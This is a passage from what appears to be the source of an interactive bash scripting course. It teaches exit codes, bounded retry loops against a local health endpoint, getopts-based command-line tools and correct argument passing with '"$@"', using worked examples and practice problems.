# 4. A bounded retry loop: try 5 times, wait 1, 2, 4, 8 seconds between tries
attempt=1 delay=1
until [[ -d /tmp ]]; do                    # replace with: curl -fsS http://localhost:8080/health
  (( attempt >= 5 )) && { echo "gave up after $attempt tries" >&2; exit 1; }
  sleep "$delay"; attempt=$(( attempt + 1 )); delay=$(( delay * 2 ))
done
echo "ready after $attempt attempt(s)"`],
    codeTitle: ['Exit codes, tests, case and a bounded retry loop'],
    viz: [{
      title: 'A bounded retry loop with backoff',
      input: '7 7 22 0',
      inputLabel: 'exit codes of each curl attempt (7 = refused, 22 = HTTP error, 28 = timeout, 0 = ok)',
      gen: function (input) {
        var codes = String(input || '').trim().split(/[\s,]+/).filter(Boolean).map(Number);
        if (!codes.length || codes.length > 8 || codes.some(function (c) { return isNaN(c) || c < 0 || c > 255 || c % 1; })) throw new Error('Give 1-8 exit codes like: 7 7 22 0');
        var meaning = { 0: 'success', 6: 'could not resolve host', 7: 'connection refused (nothing listening yet)', 22: 'HTTP 4xx/5xx (curl -f)', 28: 'timed out', 35: 'TLS handshake failed', 52: 'empty reply' };
        var MAX = 5, delay = 1, waited = 0, f = [];
        f.push({ narr: 'A deploy just restarted the app. Before we send traffic, we call <code>curl -fsS http://localhost:8080/health</code> until it succeeds, but at most <b>' + MAX + '</b> times, doubling the wait each time (1, 2, 4, 8 s). That cap is what stops a dead app from hanging the deploy forever.', parts: [
          { type: 'code', label: 'wait-healthy', lang: 'bash', code: 'attempt=1 delay=1\nuntil curl -fsS --max-time 3 "$URL" > /dev/null; do\n  (( attempt >= 5 )) && { echo "unhealthy" >&2; exit 1; }\n  sleep "$delay"\n  attempt=$((attempt + 1)) delay=$((delay * 2))\ndone\necho "healthy after $attempt attempt(s)"' },
          { type: 'vars', label: 'loop state', vals: { attempt: 1, delay: delay, waited: '0 s' } }
        ] });
        for (var i = 0; i < codes.length && i < MAX; i++) {
          var c = codes[i], ok = c === 0;
          f.push({ narr: 'Attempt <b>' + (i + 1) + '</b>: curl exits with <b>' + c + '</b> (' + (meaning[c] || 'failure') + '). ' + (ok ? 'Zero means success, so <code>until</code> stops looping.' : (i + 1 >= MAX ? 'We are at the limit, so the script prints "unhealthy" and exits 1. The pipeline marks the deploy failed instead of hanging.' : 'Non-zero, so the loop body runs: we are below the limit, so we sleep ' + delay + ' s and try again.')), parts: [
            { type: 'bars', label: 'exit code per attempt', values: codes.slice(0, i + 1).map(function (x) { return x === 0 ? 0.3 : x; }), texts: codes.slice(0, i + 1).map(String), idxLabels: codes.slice(0, i + 1).map(function (_, k) { return '#' + (k + 1); }), hl: one(i, ok ? 'ok' : 'bad') },
            { type: 'vars', label: 'loop state', vals: { attempt: i + 1, delay: ok || i + 1 >= MAX ? delay : delay + ' → ' + (delay * 2), waited: waited + ' s' }, hl: { attempt: ok ? 'ok' : 'cur' } }
          ] });
          if (ok) {
            f.push({ narr: 'Healthy after <b>' + (i + 1) + '</b> attempt(s) and ' + waited + ' s of waiting. The script exits 0, so the next pipeline step (switch traffic) runs. Read the decision from the <b>exit code</b>, not from text such as "OK" in the output.', parts: [{ type: 'text', html: H.c('g', 'exit 0 → continue the deploy') }] });
            return pad4(f, 'Try an input with a few failures first, such as <code>7 7 22 0</code>, or only failures to see the give-up path.');
          }
          if (i + 1 >= MAX) {
            f.push({ narr: 'Gave up after ' + MAX + ' attempts (' + waited + ' s of sleeping). Exit 1 tells CI, cron or the operator something is wrong. Next step: <code>journalctl -u app -n 50</code> to see why it never became healthy.', parts: [{ type: 'text', html: H.c('r', 'exit 1 → stop the deploy, keep the old version serving') }] });
            return f;
          }
          waited += delay; delay *= 2;
        }
        f.push({ narr: 'The list of attempts ran out before success or the limit. In the real loop curl would keep being called. Add a 0 to the input to see success, or more failures to see the give-up path.', parts: [{ type: 'vars', label: 'loop state', vals: { attempt: codes.length, waited: waited + ' s' } }] });
        return pad4(f, 'Each failed attempt doubles the wait (1, 2, 4, 8 s). Five attempts cover about 15 s of start-up time before the script gives up.');
      }
    }, {
      title: 'The a && b || c trap',
      input: 'check=0 notify=1',
      inputLabel: 'exit codes for the two commands in: check && notify || echo FALLBACK',
      gen: function (input) {
        var m = String(input || '').match(/check\s*=\s*(\d+)\D+notify\s*=\s*(\d+)/);
        if (!m) throw new Error('Use the form: check=0 notify=1');
        var a = Number(m[1]), b = Number(m[2]);
        var code = 'check && notify || echo "FALLBACK"';
        var f = [];
        f.push({ narr: 'Many people read <code>' + code + '</code> as "if check then notify else FALLBACK". It is <b>not</b> that. <code>&amp;&amp;</code> and <code>||</code> simply run left to right, each one looking at the exit code of whatever ran <b>last</b>.', parts: [{ type: 'code', label: 'the line', lang: 'bash', code: code }, { type: 'vars', label: 'exit codes', vals: { check: a, notify: b } }] });
        f.push({ narr: '<code>check</code> runs and exits <b>' + a + '</b>. ' + (a === 0 ? 'Success, so <code>&amp;&amp; notify</code> will run.' : 'Failure, so <code>&amp;&amp; notify</code> is <b>skipped</b>. The "last exit code" is still ' + a + '.'), parts: [{ type: 'array', label: 'commands', values: ['check', 'notify', 'echo FALLBACK'], hl: { 0: a === 0 ? 'ok' : 'bad', 1: a === 0 ? 'cur' : 'done' } }, { type: 'vars', label: 'last exit code ($?)', vals: { '$?': a } }] });
        var last = a === 0 ? b : a;
        if (a === 0) f.push({ narr: '<code>notify</code> runs and exits <b>' + b + '</b>. ' + (b === 0 ? 'Success, so the <code>||</code> part is skipped.' : 'It <b>failed</b>, so now <code>||</code> sees a non-zero code.'), parts: [{ type: 'array', label: 'commands', values: ['check', 'notify', 'echo FALLBACK'], hl: { 0: 'ok', 1: b === 0 ? 'ok' : 'bad', 2: 'cur' } }, { type: 'vars', label: 'last exit code ($?)', vals: { '$?': b } }] });
        else f.push({ narr: '<code>notify</code> never ran. <code>||</code> now looks at the last code, which is check\'s ' + a + '.', parts: [{ type: 'array', label: 'commands', values: ['check', 'notify', 'echo FALLBACK'], hl: { 0: 'bad', 1: 'done', 2: 'cur' } }, { type: 'vars', label: 'last exit code ($?)', vals: { '$?': a } }] });
        var fb = last !== 0;
        f.push({ narr: fb ? ('FALLBACK runs. ' + (a === 0 ? H.c('r', 'Surprise: check succeeded, yet the "else" branch ran because notify failed.') + ' That is the trap.' : 'Here it matches the if/else reading, because check failed.')) : 'FALLBACK is skipped because the last command succeeded.', parts: [{ type: 'array', label: 'commands', values: ['check', 'notify', 'echo FALLBACK'], hl: { 0: a === 0 ? 'ok' : 'bad', 1: a === 0 ? (b === 0 ? 'ok' : 'bad') : 'done', 2: fb ? 'sel' : 'done' } }] });
        f.push({ narr: 'When you mean if/else, write <code>if</code>. It is longer, but it says exactly what happens, and the else branch depends only on <code>check</code>. Use <code>&amp;&amp;</code> / <code>||</code> for simple one-step guards like <code>cd "$dir" || exit 1</code>.', parts: [{ type: 'code', label: 'clear version', lang: 'bash', code: 'if check; then\n  notify || echo "notify failed (check was fine)" >&2\nelse\n  echo "FALLBACK"\nfi' }] });
        return f;
      }
    }],
    examples: [
      { title: 'A disk check that speaks the monitoring language', html: `<p>Nagios, Icinga, Zabbix agents and many cloud monitoring agents run small "check" scripts and read the exit code: ${H.c('g', '0 OK')}, ${H.c('y', '1 WARNING')}, ${H.c('r', '2 CRITICAL')}, 3 UNKNOWN. A function can <code>return</code> a code the same way a script exits with one.</p>`, code: B`#!/usr/bin/env bash
# exit 0 = OK, 1 = WARNING, 2 = CRITICAL (Nagios plugin convention)
check_level() {
  local used="$1" warn=80 crit=90
  if (( used >= crit )); then echo "CRITICAL \${used}%"; return 2
  elif (( used >= warn )); then echo "WARNING \${used}%"; return 1
  else echo "OK \${used}%"; return 0
  fi
}
for pct in 42 85 97; do
  check_level "$pct"
  echo "  exit code: $?"
done
# Output:
# OK 42%
#   exit code: 0
# WARNING 85%
#   exit code: 1
# CRITICAL 97%
#   exit code: 2` },
      { title: 'case for HTTP status codes', html: `<p>A synthetic check script gets a status code from <code>curl -s -o /dev/null -w '%{http_code}'</code> and must react differently to each class. <code>case</code> patterns use glob syntax, so <code>5??</code> means "5 followed by any two characters".</p>`, code: B`#!/usr/bin/env bash
for status in 200 301 404 503 abc; do
  case "$status" in
    2??) echo "$status ok" ;;
    3??) echo "$status redirect" ;;
    4??) echo "$status client error" ;;
    5??) echo "$status server error, page someone" ;;
    *)   echo "$status not a status code" ;;
  esac
done
# Output:
# 200 ok
# 301 redirect
# 404 client error
# 503 server error, page someone
# abc not a status code` },
      { title: 'The while loop that "forgot" its count', html: `<p>A script counted unhealthy hosts with <code>cat hosts.txt | while read ...</code> and always reported ${H.c('r', '0')}. Each part of a pipe runs in a <b>subshell</b> (a copy of the shell), so the loop changed its own copy of <code>count</code>, which vanished when the pipe ended. Redirect the file into the loop instead, and the loop runs in the main shell.</p>`, code: B`#!/usr/bin/env bash
cd "$(mktemp -d)"
printf 'web1\nweb2\nweb3\n' > hosts.txt
count=0
cat hosts.txt | while read -r h; do count=$((count + 1)); done
echo "pipe loop count: $count"
count=0
while read -r h; do count=$((count + 1)); done < hosts.txt
echo "redirect loop count: $count"
# Output:
# pipe loop count: 0
# redirect loop count: 3` },
      { title: 'Decoding exit codes in a cron failure email', html: `<p>Cron mailed <code>exit status 127</code> for a job that runs fine by hand: the command is not on cron's short <code>PATH</code>. Another job died with ${H.c('r', '137')} = 128 + 9: it was SIGKILLed, and <code>journalctl -k | grep -i "out of memory"</code> showed the OOM killer. Knowing the table turns a mystery number into the next command to run.</p>`, code: B`#!/usr/bin/env bash
explain_exit() {
  local c="$1"
  if   (( c == 0 ));   then echo "$c: success"
  elif (( c == 126 )); then echo "$c: found but not executable (chmod +x? noexec mount?)"
  elif (( c == 127 )); then echo "$c: command not found (PATH under cron?)"
  elif (( c > 128 && c < 160 )); then echo "$c: killed by signal $(( c - 128 )) ($(kill -l $(( c - 128 ))))"
  else echo "$c: the program's own failure code, read its docs or logs"
  fi
}
for c in 0 1 126 127 130 137 143; do explain_exit "$c"; done
# Output:
# 0: success
# 1: the program's own failure code, read its docs or logs
# 126: found but not executable (chmod +x? noexec mount?)
# 127: command not found (PATH under cron?)
# 130: killed by signal 2 (INT)
# 137: killed by signal 9 (KILL)
# 143: killed by signal 15 (TERM)` }
    ],
    deepDive: `<p>🟣 <b><code>[[ ]]</code> vs <code>[ ]</code> vs <code>test</code>.</b> <code>[</code> is an ordinary command (also <code>/usr/bin/[</code>), so its arguments go through word splitting: <code>[ $v = x ]</code> breaks when v is empty or has spaces. <code>[[ ]]</code> is bash syntax: no splitting inside, supports <code>&amp;&amp;</code>, <code>||</code>, <code>=~</code> and patterns. In bash scripts use <code>[[ ]]</code>; in <code>/bin/sh</code> scripts (dash on Ubuntu, which cron and Docker often use) only <code>[ ]</code> exists, so quote everything.</p>
      <p><b>Exit code of a function, a pipe, a loop.</b> A function returns the code of its last command (or <code>return N</code>). A pipeline returns the code of its <b>last</b> command unless <code>pipefail</code> is on (next topics). A loop returns the code of the last command it ran inside. <code>$?</code> is overwritten by <b>every</b> command, including <code>echo</code> and <code>[[ ]]</code>, so save it at once: <code>rc=$?</code>.</p>
      <p><b>Only 0-255.</b> <code>exit 256</code> becomes 0 and <code>exit -1</code> becomes 255, because only the low 8 bits survive. Keep your own codes small and documented. Codes above 128 are read as "killed by a signal" by most tools, so do not use them for normal failures.</p>
      <p><b>Loops at scale.</b> A <code>while read</code> loop that starts <code>grep</code>, <code>awk</code> or <code>date</code> for every line of a million-line log takes minutes, because starting a process costs about a millisecond. Do bulk text work in one awk pass and keep the shell loop for the "per host / per file" level. Reading files: <code>while IFS= read -r line || [[ -n $line ]]</code> also catches a last line that has no newline at the end, which hand-edited host lists often lack.</p>
      <p><b>Backoff with jitter.</b> If 200 servers retry a shared dependency on the exact same 1, 2, 4 second schedule, they hit it in synchronised waves. Adding a random part (<code>sleep $(( delay + RANDOM % delay ))</code>) spreads them out. The AWS Architecture Blog's "Exponential Backoff and Jitter" is the standard reference.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> an assistant explains "exit status 137" or "what does curl exit code 28 mean" faster than the man page, and writes a decent retry loop on request. Pasting a failed CI log and asking "which command failed and with which code?" is a great use.</p>
      <p><b>Where it goes wrong:</b> generated retry loops often have <b>no limit</b> (<code>while true</code>), no sleep, or they check output text (<code>if [[ $(curl ...) == *OK* ]]</code>) instead of the exit code. They also use <code>a &amp;&amp; b || c</code> as if/else, and forget that grep's "no match" is exit 1. <b>Your job:</b> insist on a maximum number of attempts or a deadline, backoff, a clear non-zero exit when giving up, and decisions based on exit codes. Ask the assistant to list every exit code the script can return; if it cannot, the script is not finished.</p>`,
    problems: [P({
      t: 'Wait for the app to become healthy before switching traffic', l: 'Easy', tags: ['loops', 'exit codes', 'curl', 'deploy'], co: ['DigitalOcean', 'Atlassian'],
      s: `<p>After a deploy restarts the app, the pipeline must wait until <code>http://localhost:8080/health</code> answers with HTTP 2xx, then continue. Today the step is <code>sleep 30</code>: sometimes the app needs 45 seconds (traffic hits a cold app) and sometimes it never starts (the deploy still "succeeds"). Write <code>wait-healthy.sh URL [TIMEOUT_SECONDS]</code> that polls the URL, gives up after the timeout (default 60), prints progress, and exits 0 when healthy and 1 when not.</p>`,
      ex: `<p>App up after 12 s: output ${H.c('g', 'attempt 1: not ready (curl exit 7) ... attempt 5: healthy after 12s')}, exit 0. App never starts: ${H.c('r', 'unhealthy after 60s (last curl exit 7)')}, exit 1, and the pipeline stops before switching traffic. Wrong usage (no URL): usage message, exit 2.</p>`,
      bw: `<p><code>sleep 30</code> guesses. Too short and users get errors; too long and every deploy wastes time; and it never notices an app that did not start. An endless <code>until curl ...; do sleep 1; done</code> is the opposite mistake: a broken release hangs the pipeline until someone kills it.</p>`,
      bc: B`sleep 30          # hope the app is ready; never notices a dead app
# or, the endless version:
until curl -fs http://localhost:8080/health; do sleep 1; done`,
      q: ['What should decide whether the app is healthy?', ['The exit code of <code>curl -fsS --max-time 3</code> (non-zero on connection errors and HTTP 4xx/5xx)', 'Whether the curl output contains the word "OK"', 'Whether <code>systemctl is-active</code> prints "active"', 'A fixed 30-second sleep'], 0, 'With -f curl turns HTTP errors into exit code 22, and connection problems already give non-zero codes, so the exit code covers every failure. Text matching breaks when the body changes. "active" only means the process is running, not that it serves requests.'],
      h: ['<p>Hint 1: use <code>SECONDS</code>, a bash variable that counts seconds since the script started, to build a deadline instead of counting attempts.</p>', '<p>Hint 2: <code>curl -fsS --max-time 3 -o /dev/null URL</code>: <code>-f</code> fails on HTTP errors, <code>--max-time</code> stops one hung request from eating the whole budget. Save <code>rc=$?</code> right away.</p>', '<p>Hint 3: recipe: validate arguments → loop: try → on success print and exit 0 → if past the deadline print the last code and exit 1 → sleep a growing delay capped at 5 s.</p>'],
      a: `<p>Validate the URL and timeout (number) first. Loop: run curl with <code>-f</code>, a per-request <code>--max-time</code> and output to <code>/dev/null</code>; capture its exit code right away. On 0, print how long it took and exit 0. Otherwise compare <code>SECONDS</code> with the deadline: past it, print the last curl code (so the operator knows if it was "refused" (7), "timeout" (28) or "HTTP error" (22)) and exit 1. Sleep with a growing delay (1, 2, 4, capped at 5 s) so we react quickly but do not hammer the app. Because we inspect codes ourselves, the loop does not use <code>set -e</code> on the curl line; it uses <code>if</code>.</p>`,
      code: B`#!/usr/bin/env bash
# wait-healthy.sh URL [TIMEOUT_SECONDS]  -> exit 0 healthy, 1 unhealthy, 2 bad usage
set -uo pipefail

url="\${1:-}"
timeout="\${2:-60}"
if [[ -z $url ]]; then echo "usage: \${0##*/} URL [TIMEOUT_SECONDS]" >&2; exit 2; fi
if ! [[ $timeout =~ ^[0-9]+$ ]]; then echo "TIMEOUT must be whole seconds" >&2; exit 2; fi

deadline=$(( SECONDS + timeout ))
attempt=0 delay=1 rc=0
while :; do
  attempt=$(( attempt + 1 ))
  if curl -fsS --max-time 3 -o /dev/null "$url"; then
    echo "attempt $attempt: healthy after \${SECONDS}s"
    exit 0
  else
    rc=$?
  fi
  if (( SECONDS >= deadline )); then
    echo "unhealthy after \${timeout}s (last curl exit $rc)" >&2
    exit 1
  fi
  echo "attempt $attempt: not ready (curl exit $rc), retrying in \${delay}s"
  sleep "$delay"
  delay=$(( delay * 2 )); (( delay > 5 )) && delay=5
done`,
      cx: `<p>At most about TIMEOUT / delay requests, each capped at 3 s. Worst-case runtime is the timeout plus one request. No extra load worth mentioning on the app.</p>`,
      f: ['How would you also require 3 healthy answers in a row before declaring success?', 'Why might the health endpoint return 200 while the app is still broken for users, and what would a better check test?']
    })]
  });

  // ───────────────────────── Topic 3: functions and arguments ─────────────────────────
  topics.push({
    title: 'Functions and Arguments: Turning a Runbook into a Small Tool',
    analogy: `<p>A runbook says "run these six commands, change the hostname in step 3, and do not forget step 5". A script with <b>arguments</b> and <b>functions</b> is that runbook turned into a <b>vending machine</b>: you press buttons (<code>-e prod -v 1.4.2</code>), the machine checks you pressed valid ones, and every step inside is a labelled compartment (a function) that does one job the same way every time. Nobody has to remember step 5 again.</p>`,
    explain: `<p>🟢 <b>Arguments.</b> When you run <code>./deploy.sh web1 web2</code>, the script sees:</p>
      ${H.table(['Name', 'Value here', 'Meaning'], [
        ['<code>$0</code>', './deploy.sh', 'how the script was called'],
        ['<code>$1</code>, <code>$2</code>', 'web1, web2', 'positional arguments (<code>&#36;{10}</code> needs braces)'],
        ['<code>$#</code>', '2', 'how many arguments'],
        ['<code>"$@"</code>', '"web1" "web2"', '<b>all</b> arguments, each kept as one word: use this'],
        ['<code>"$*"</code>', '"web1 web2"', 'all arguments glued into one string (for messages only)'],
        ['<code>shift</code>', '$1 becomes web2', 'drop the first argument and move the rest left']
      ])}
      <p>🟢 <b>Functions.</b> <code>name() { commands; }</code> defines one. Call it like a command: <code>backup_db "$db"</code>. Inside, its own arguments are <code>$1</code>, <code>"$@"</code> and so on. Declare its variables with <code>local</code>, otherwise they leak out and overwrite variables of the same name in the rest of the script.</p>
      <p>🟢 <b>Two ways a function gives something back.</b> Its <b>exit code</b> (<code>return 0</code> / <code>return 1</code>) says success or failure, so you can write <code>if is_healthy web1; then</code>. Its <b>output</b> (what it echoes) is the data, which you capture with <code>latest="$(latest_release)"</code>. Send messages for humans to <b>stderr</b> (<code>&gt;&amp;2</code>) so they do not get mixed into the captured data.</p>
      <p>🔵 <b>Options with <code>getopts</code>.</b> Real tools take flags: <code>deploy.sh -e prod -v 1.4.2 -n web1 web2</code>. <code>getopts ':e:v:nh' opt</code> reads them one by one. A letter followed by <code>:</code> takes a value (in <code>$OPTARG</code>). The leading <code>:</code> lets you print your own error messages. After the loop, <code>shift $((OPTIND - 1))</code> removes the options so <code>"$@"</code> holds only the hosts. (<code>getopts</code> handles short options only; for <code>--long</code> options write a <code>while (( $# )); case $1 in</code> loop.)</p>
      <p>🔵 <b>The shape of a good ops script.</b></p>
      <ul><li>A <code>usage()</code> function with a here-doc help text, shown on <code>-h</code> and on bad input (exit 2).</li>
      <li><code>log()</code> and <code>die()</code> helpers that write timestamped lines to stderr; <code>die</code> also exits non-zero.</li>
      <li>One function per step (<code>check_inputs</code>, <code>backup</code>, <code>upload</code>, <code>verify</code>), each small enough to read in one screen.</li>
      <li>A <code>main()</code> function and, as the last line, <code>main "$@"</code>. The whole file is read before anything runs, so a half-downloaded script cannot run half its steps.</li></ul>`,
    clues: [
      '"the script takes host names / a version / an environment" → positional args or <code>getopts</code> with validation and a <code>usage()</code>',
      '"arguments with spaces got split" → pass them on with <code>"$@"</code>, never <code>$*</code> or <code>$@</code> unquoted',
      '"a variable changed mysteriously" → a function assigned it without <code>local</code>',
      '"capture the result of a function" → echo the data, <code>x="$(fn)"</code>; use the exit code for success or failure; logs go to stderr',
      '"make the script reusable for staging and prod" → options or environment variables with defaults, not edited copies of the script',
      '"wrapper around another command" → <code>exec cmd "$@"</code> passes every argument through untouched'
    ],
    code: [B`#!/usr/bin/env bash
# deploy.sh - skeleton of a well-shaped ops tool. Try:
#   bash deploy.sh -h
#   bash deploy.sh -e prod -v 1.4.2 -n web1 web2
#   bash deploy.sh -e prod -v 1.4          (bad version -> exit 2)
set -euo pipefail

log() { printf '%s [%s] %s\n' "$(date -u +%H:%M:%S)" "\${0##*/}" "$*" >&2; }
die() { log "ERROR: $*"; exit 1; }

usage() {
  cat <<USAGE
usage: \${0##*/} -e ENV -v VERSION [-n] HOST...
  -e ENV      staging or prod
  -v VERSION  release to deploy, e.g. 1.4.2
  -n          dry run: print what would happen
  -h          show this help
USAGE
}

deploy_host() {                       # deploy_host HOST VERSION DRY
  local host="$1" version="$2" dry="$3"
  if (( dry )); then
    echo "[dry-run] deploy $version to $host"
    return 0
  fi
  echo "deploy $version to $host"     # real work would go here (rsync, ssh, systemctl)
}

main() {
  local env="" version="" dry=0 opt
  while getopts ':e:v:nh' opt; do
    case "$opt" in
      e) env="$OPTARG" ;;
      v) version="$OPTARG" ;;
      n) dry=1 ;;
      h) usage; exit 0 ;;
      :) usage >&2; die "option -$OPTARG needs a value" ;;
      \?) usage >&2; die "unknown option -$OPTARG" ;;
    esac
  done
  shift $(( OPTIND - 1 ))             # now "$@" is just the hosts

  [[ $env == staging || $env == prod ]]        || { usage >&2; exit 2; }
  [[ $version =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]   || { log "-v must look like 1.4.2"; exit 2; }
  (( $# > 0 ))                                 || { log "give at least one HOST"; exit 2; }

  log "deploying $version to $# host(s) in $env"
  local host
  for host in "$@"; do
    deploy_host "$host" "$version" "$dry" || die "deploy failed on $host"
  done
  log "done"
}

main "$@"`],
    codeTitle: ['A full CLI skeleton: usage, log, die, getopts and main "$@"'],
    viz: [{
      title: 'getopts reads the options one by one',
      input: '-e prod -v 1.4.2 -n web1 web2',
      inputLabel: 'arguments for deploy.sh (option string is :e:v:nh)',
      gen: function (input) {
        var words = shellWords(String(input || ''));
        if (words.length > 12) throw new Error('Keep it to 12 words or fewer');
        var spec = { e: true, v: true, n: false, h: false };
        var vars = { env: '', version: '', dry: '0' }, f = [], idx = 0, stop = false, err = null;
        f.push({ narr: 'The script was started as <code>deploy.sh ' + H.esc(input) + '</code>. Bash has split that into <b>' + words.length + '</b> words: <code>$1</code> to <code>$' + words.length + '</code>. <code>getopts \':e:v:nh\'</code> will walk through them. Letters followed by <code>:</code> (e and v) need a value.', parts: [
          { type: 'array', label: '"$@" before getopts', values: words.length ? words : ['(none)'], showIdx: true, start: 1 },
          { type: 'vars', label: 'getopts state', vals: { OPTIND: 1 } }
        ] });
        while (idx < words.length && !stop && !err) {
          var w = words[idx];
          if (w === '--') { idx++; f.push({ narr: '<code>--</code> means "end of options". getopts stops and skips it, so the next words are treated as plain arguments even if they start with a dash.', parts: [{ type: 'array', label: '"$@"', values: words, hl: one(idx - 1, 'done'), start: 1 }, { type: 'vars', label: 'getopts state', vals: { OPTIND: idx + 1 } }] }); break; }
          if (w.charAt(0) !== '-' || w === '-') { stop = true; break; }
          var startIdx = idx;
          for (var k = 1; k < w.length; k++) {
            var ch = w.charAt(k);
            if (!(ch in spec)) { err = 'unknown option -' + ch; f.push({ narr: '<code>-' + H.esc(ch) + '</code> is not in the option string, so getopts sets <code>opt</code> to <code>?</code> and <code>OPTARG</code> to ' + H.esc(ch) + '. Our <code>\\?)</code> branch prints usage and calls <code>die</code>, which exits 1. ' + H.c('r', 'A typo stops the script before it touches any server.'), parts: [{ type: 'array', label: '"$@"', values: words, hl: one(idx, 'bad'), start: 1 }, { type: 'vars', label: 'case branch', vals: { opt: '?', OPTARG: ch }, hl: { opt: 'bad' } }] }); break; }
            if (spec[ch]) {
              var val = w.slice(k + 1);
              if (!val) { idx++; val = words[idx]; }
              if (val === undefined) { err = 'missing value'; f.push({ narr: '<code>-' + ch + '</code> needs a value, but the words ran out. getopts sets <code>opt</code> to <code>:</code>, and our <code>:)</code> branch prints "option -' + ch + ' needs a value" and exits 1.', parts: [{ type: 'array', label: '"$@"', values: words, hl: one(startIdx, 'bad'), start: 1 }, { type: 'vars', label: 'case branch', vals: { opt: ':', OPTARG: ch }, hl: { opt: 'bad' } }] }); break; }
              var name = ch === 'e' ? 'env' : 'version';
              vars[name] = val;
              var hl = {}; hl[startIdx] = 'cur'; if (idx !== startIdx) hl[idx] = 'ok';
              f.push({ narr: '<code>-' + ch + '</code> takes a value, so getopts puts the next text, <b>' + H.esc(val) + '</b>, in <code>$OPTARG</code>. Our <code>' + ch + ')</code> branch stores it in <code>' + name + '</code>.' + (name === 'version' && !/^\d+\.\d+\.\d+$/.test(val) ? ' (Later validation will reject it: it does not look like 1.4.2.)' : ''), parts: [{ type: 'array', label: '"$@"', values: words, hl: hl, start: 1 }, { type: 'vars', label: 'variables', vals: { opt: ch, OPTARG: val, env: vars.env, version: vars.version, dry: vars.dry, OPTIND: idx + 2 }, hl: one(name, 'ok') }] });
              break;
            } else {
              if (ch === 'h') { f.push({ narr: '<code>-h</code>: print usage and exit 0. Nothing else runs.', parts: [{ type: 'array', label: '"$@"', values: words, hl: one(idx, 'sel'), start: 1 }, { type: 'text', html: 'usage: deploy.sh -e ENV -v VERSION [-n] HOST...' }] }); stop = true; err = 'help'; break; }
              vars.dry = '1';
              f.push({ narr: '<code>-' + ch + '</code> is a plain flag (no colon after it in the option string). Our <code>n)</code> branch sets <code>dry=1</code>.', parts: [{ type: 'array', label: '"$@"', values: words, hl: one(idx, 'cur'), start: 1 }, { type: 'vars', label: 'variables', vals: { opt: ch, env: vars.env, version: vars.version, dry: vars.dry, OPTIND: idx + 2 }, hl: { dry: 'ok' } }] });
            }
          }
          idx++;
        }
        if (!err) {
          var rest = words.slice(idx);
          f.push({ narr: (idx < words.length ? '<code>' + H.esc(words[idx]) + '</code> does not start with a dash, so getopts returns false and the loop ends. ' : 'No words left, so getopts returns false and the loop ends. ') + '<code>OPTIND</code> is ' + (idx + 1) + '. <code>shift $((OPTIND - 1))</code> drops the ' + idx + ' option word(s).', parts: [
            { type: 'array', label: '"$@" before shift', values: words.length ? words : ['(none)'], hl: (function () { var h = {}; for (var j = 0; j < idx; j++) h[j] = 'done'; for (var j2 = idx; j2 < words.length; j2++) h[j2] = 'ok'; return h; })(), start: 1 },
            { type: 'vars', label: 'getopts state', vals: { OPTIND: idx + 1 } }
          ] });
          f.push({ narr: 'Now <code>"$@"</code> holds only the hosts: <b>' + (rest.length ? rest.map(H.esc).join(', ') : 'none') + '</b>. ' + (rest.length ? 'The script loops over them with <code>for host in "$@"</code>.' : H.c('r', 'No hosts given, so validation prints "give at least one HOST" and exits 2.')), parts: [
            { type: 'array', label: '"$@" after shift', values: rest.length ? rest : ['(empty)'], hl: rest.length ? {} : { 0: 'bad' }, start: 1 },
            { type: 'vars', label: 'parsed settings', vals: { env: vars.env || '(unset)', version: vars.version || '(unset)', dry: vars.dry }, hl: { env: vars.env ? 'ok' : 'bad', version: vars.version ? 'ok' : 'bad' } }
          ] });
        }
        while (f.length < 4) f.push({ narr: 'Try other inputs: a typo like <code>-x</code>, a missing value like <code>-v</code> at the end, or flags glued together like <code>-nv1.4.2</code>.', parts: [{ type: 'text', html: 'getopts accepts -n -v 1.4.2, -nv 1.4.2 and -nv1.4.2 the same way.' }] });
        return f;
      }
    }, {
      title: '"$@" vs $* vs "$*"',
      input: 'web1 "app server" db1',
      inputLabel: 'arguments, use quotes to make one argument with a space',
      gen: function (input) {
        var args = shellWords(String(input || ''));
        if (!args.length || args.length > 8) throw new Error('Give 1-8 arguments, e.g. web1 "app server" db1');
        var split = []; args.forEach(function (a) { split = split.concat(a.split(/\s+/).filter(Boolean)); });
        var joined = [args.join(' ')];
        var f = [];
        f.push({ narr: 'The script was called with <b>' + args.length + '</b> arguments. Quotes on the command line made <code>' + H.esc(args.filter(function (a) { return /\s/.test(a); })[0] || args[0]) + '</code> a single argument. Now the script passes them on to a function <code>show</code> in three different ways.', parts: [{ type: 'array', label: 'what the script received ($1, $2, ...)', values: args, start: 1 }] });
        f.push({ narr: '<code>show "$@"</code>: every argument is passed on <b>exactly</b> as it arrived. ' + args.length + ' in, ' + args.length + ' out. This is the one you want 99% of the time.', parts: [{ type: 'array', label: 'show "$@" receives', values: args, hl: (function () { var h = {}; args.forEach(function (_, i) { h[i] = 'ok'; }); return h; })(), start: 1 }] });
        f.push({ narr: '<code>show $*</code> (or unquoted <code>$@</code>): the arguments are glued, then <b>split again</b> on spaces. ' + (split.length !== args.length ? H.c('r', 'Arguments with spaces fall apart: ' + split.length + ' pieces now.') : 'No spaces here, so it looks fine, until a value has one.'), parts: [{ type: 'array', label: 'show $* receives', values: split, hl: (function () { var h = {}; split.forEach(function (w, i) { if (args.indexOf(w) < 0) h[i] = 'bad'; }); return h; })(), start: 1 }] });
        f.push({ narr: '<code>show "$*"</code>: everything is glued into <b>one</b> string, separated by spaces. Good for a log message (<code>log "hosts: $*"</code>), wrong for passing arguments on.', parts: [{ type: 'array', label: 'show "$*" receives', values: joined, hl: { 0: 'cur' }, start: 1 }] });
        f.push({ narr: 'Rule of thumb: <b>pass on with "$@"</b>, <b>print with "$*"</b>. The same applies to arrays: <code>"' + DH + 'arr[@]}"</code> to pass, <code>"' + DH + 'arr[*]}"</code> to print.', parts: [{ type: 'table', label: 'summary', columns: ['form', 'count', 'safe to pass on?'], rows: [['"$@"', String(args.length), 'yes'], ['$*  or  $@', String(split.length), 'no'], ['"$*"', '1', 'no (messages only)']], hl: { 0: 'ok' } }] });
        return f;
      }
    }],
    examples: [
      { title: '"$@" keeps "app server" in one piece', html: `<p>A wrapper script passed host names to an inner script with <code>$*</code>. A host group called <code>app server</code> became two hosts that do not exist. This self-contained script shows the three forms side by side. Run it as <code>bash args.sh web1 "app server" db1</code>.</p>`, code: B`#!/usr/bin/env bash
show() { echo "  $# args:"; printf '    <%s>\n' "$@"; }
echo 'with "$@":'; show "$@"
